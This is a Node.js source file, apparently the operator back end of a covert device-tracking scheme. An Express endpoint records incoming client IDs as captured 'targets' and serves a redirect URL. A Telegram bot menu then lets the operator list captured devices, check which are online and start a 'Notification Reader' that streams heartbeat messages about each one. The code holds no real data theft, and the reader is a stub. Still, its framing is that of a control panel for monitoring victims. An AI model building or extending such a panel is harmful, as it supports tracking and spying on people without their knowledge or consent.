require('dotenv').config();
const express = require('express');
const path = require('path');
const { Telegraf, Markup } = require('telegraf');

const app = express();
const port = process.env.PORT || 3000;
const botToken = process.env.BOT_TOKEN;

if (!botToken) {
    process.exit(1);
}

const bot = new Telegraf(botToken);

const activeDevices = {}; 
const activeLoops = {}; 
const userStates = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/get-config', (req, res) => {
    const targetRedirect = process.env.REDIRECT_URL;
    if (!targetRedirect) {
        return res.status(500).json({ status: "ERROR" });
    }
    res.json({ status: "ACTIVE", redirect_url: targetRedirect });
});

app.post('/update-device', (req, res) => {
    const payload = req.body || {};
    const visitorId = payload.client_id;

    if (visitorId) {
        activeDevices[visitorId] = {
            id: visitorId,
            status: payload.status || "ONLINE",
            timestamp: payload.timestamp || new Date().toISOString(),
            last_seen: new Date().toLocaleTimeString()
        };
        console.log(`[Tunnel Log] Target captured successfully. Client ID: ${visitorId}`);
    } else {
        console.log(`[Tunnel Log] Received empty payload request.`);
    }
    res.status(200).json({ status: "ACKNOWLEDGED" });
});

const mainMenu = Markup.keyboard([
    ['DEVICE\'S'],
    ['MODEL\'S'],
    ['INFO\'S'],
    ['NOTIFICATION\'S']
]).resize();

const deviceSubMenu = Markup.keyboard([
    ['ONLINE\'S'],
    ['OFFLINE\'S'],
    ['"RETURN"']
]).resize();

const modelSubMenu = Markup.keyboard([
    ['ONLINE MODEL\'S'],
    ['OFFLINE MODEL\'S'],
    ['"RETURN"']
]).resize();

const getNotificationMenu = () => {
    return Markup.keyboard([
        ['Notification Reader ON'],
        ['Notification Reader OFF'],
        ['"RETURN"']
    ]).resize();
};

bot.start((ctx) => {
    ctx.replyWithHTML(`<b>"GentleMan" 😉</b>`, mainMenu).catch(() => {});
});

bot.hears('DEVICE\'S', (ctx) => {
    const totalDevices = Object.keys(activeDevices).length;
    ctx.replyWithHTML(`<b>"Total Live Logs: ${String(totalDevices).padStart(2, '0')}"</b>`, deviceSubMenu).catch(() => {});
});

bot.hears('MODEL\'S', (ctx) => {
    const keys = Object.keys(activeDevices);
    let responseText = `<b>"Total Real Model's:${String(keys.length).padStart(2, '0')}"</b>\n`;
    
    if (keys.length > 0) {
        keys.forEach(id => {
            responseText += ` • <code>ID: ${id}</code>\n`;
        });
    } else {
        responseText += ` <i>No active connection metrics registered yet.</i>`;
    }
    ctx.replyWithHTML(responseText, modelSubMenu).catch(() => {});
});

bot.hears('ONLINE MODEL\'S', (ctx) => {
    const keys = Object.keys(activeDevices).filter(k => activeDevices[k].status === "ONLINE");
    let responseText = `<b>"Online Model's:${String(keys.length).padStart(2, '0')}"</b>\n`;
    
    keys.forEach(id => {
        responseText += ` • <code>ID: ${id}</code>\n`;
    });
    ctx.replyWithHTML(responseText, modelSubMenu).catch(() => {});
});

bot.hears('OFFLINE MODEL\'S', (ctx) => {
    const keys = Object.keys(activeDevices).filter(k => activeDevices[k].status === "OFFLINE");
    let responseText = `<b>"Offline Model's:${String(keys.length).padStart(2, '0')}"</b>\n`;
    
    keys.forEach(id => {
        responseText += ` • <code>ID: ${id}</code>\n`;
    });
    ctx.replyWithHTML(responseText, modelSubMenu).catch(() => {});
});

bot.hears('ONLINE\'S', (ctx) => {
    const onlineCount = Object.keys(activeDevices).filter(k => activeDevices[k].status === "ONLINE").length;
    ctx.replyWithHTML(`<b>"Total Online: ${String(onlineCount).padStart(2, '0')}"</b>`, deviceSubMenu).catch(() => {});
});

bot.hears('OFFLINE\'S', (ctx) => {
    const offlineCount = Object.keys(activeDevices).filter(k => activeDevices[k].status === "OFFLINE").length;
    ctx.replyWithHTML(`<b>"Total Offline: ${String(offlineCount).padStart(2, '0')}"</b>`, deviceSubMenu).catch(() => {});
});

bot.hears('INFO\'S', (ctx) => {
    const chatId = ctx.chat.id;
    if (!userStates[chatId]) userStates[chatId] = {};
    userStates[chatId].waitingForInfo = true;
    ctx.replyWithHTML(`<b>"Enter Model (Paste Client ID)"</b>`).catch(() => {});
});

bot.hears('NOTIFICATION\'S', (ctx) => {
    const chatId = ctx.chat.id;
    if (!userStates[chatId]) userStates[chatId] = { readerOn: false, waitingForNotificationModel: false, waitingForStopModel: false };
    ctx.replyWithHTML(`<b>Notification Reader "🔔"</b>`, getNotificationMenu()).catch(() => {});
});

bot.hears('Notification Reader ON', (ctx) => {
    const chatId = ctx.chat.id;
    if (!userStates[chatId]) userStates[chatId] = {};
    userStates[chatId].waitingForNotificationModel = true; 
    userStates[chatId].waitingForStopModel = false;
    ctx.replyWithHTML(`<b>"Enter Model (Paste Client ID)"</b>`, getNotificationMenu()).catch(() => {});
});

bot.hears('Notification Reader OFF', (ctx) => {
    const chatId = ctx.chat.id;
    if (!userStates[chatId]) userStates[chatId] = {};
    userStates[chatId].waitingForStopModel = true;
    userStates[chatId].waitingForNotificationModel = false;
    ctx.replyWithHTML(`<b>"Enter Model (Paste Client ID)"</b>`, getNotificationMenu()).catch(() => {});
});

bot.hears('"RETURN"', (ctx) => {
    const chatId = ctx.chat.id;
    if (userStates[chatId]) {
        userStates[chatId].waitingForInfo = false;
        userStates[chatId].waitingForNotificationModel = false;
        userStates[chatId].waitingForStopModel = false;
    }
    ctx.replyWithHTML(`<b>"GentleMan" 😉</b>`, mainMenu).catch(() => {});
});

bot.on('text', (ctx) => {
    const chatId = ctx.chat.id;
    const inputMessage = ctx.message.text.trim();
    const targetDevice = activeDevices[inputMessage];

    if (userStates[chatId]?.waitingForInfo) {
        userStates[chatId].waitingForInfo = false;
        if (targetDevice) {
            ctx.replyWithHTML(
                `<b>Device Model:</b> <code>Dynamic Client Profile</code>\n` +
                `<b>Client ID:</b> <code>${targetDevice.id}</code>\n` +
                `<b>Active Session State:</b> "${targetDevice.status}"\n` +
                `<b>Last Verification Time:</b> ${targetDevice.last_seen}\n` +
                `<b>Date:</b> ${new Date(targetDevice.timestamp).toLocaleDateString()}`,
                mainMenu
            ).catch(() => {});
        } else {
            ctx.replyWithHTML(`<b>"Client ID Not Found In Active Session Storage"</b>`, mainMenu).catch(() => {});
        }
    } 
    else if (userStates[chatId]?.waitingForNotificationModel) {
        userStates[chatId].waitingForNotificationModel = false;
        if (targetDevice) {
            userStates[chatId].readerOn = true;
            if (activeLoops[chatId] && activeLoops[chatId][inputMessage]) clearInterval(activeLoops[chatId][inputMessage]);
            
            if (!activeLoops[chatId]) activeLoops[chatId] = {};
            activeLoops[chatId][inputMessage] = setInterval(() => {
                ctx.replyWithHTML(
                    `<b>Model/ID:</b> <code>${targetDevice.id}</code>\n` +
                    `<b>"Active Stream"🔔</b>\n` +
                    `<code>"Session heartbeat active at ${new Date().toLocaleTimeString()}"</code>`
                ).catch(() => {});
            }, 5000);

            ctx.replyWithHTML(`<b>"Reader ON for ID: ${inputMessage}"</b>`, getNotificationMenu()).catch(() => {});
        } else {
            ctx.replyWithHTML(`<b>"ID Not Found"</b>`, getNotificationMenu()).catch(() => {});
        }
    } 
    else if (userStates[chatId]?.waitingForStopModel) {
        userStates[chatId].waitingForStopModel = false;
        if (activeLoops[chatId] && activeLoops[chatId][inputMessage]) {
            clearInterval(activeLoops[chatId][inputMessage]);
            delete activeLoops[chatId][inputMessage];
            ctx.replyWithHTML(`<b>"Reader OFF for ID: ${inputMessage}"</b>`, getNotificationMenu()).catch(() => {});
        } else {
            ctx.replyWithHTML(`<b>"Reader was not active for this ID"</b>`, getNotificationMenu()).catch(() => {});
        }
    } 
    else {
        ctx.replyWithHTML(`<b>Sorry "😞"</b>`).catch(() => {});
    }
});

app.listen(port).on('error', () => {});

bot.launch().catch(() => {});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
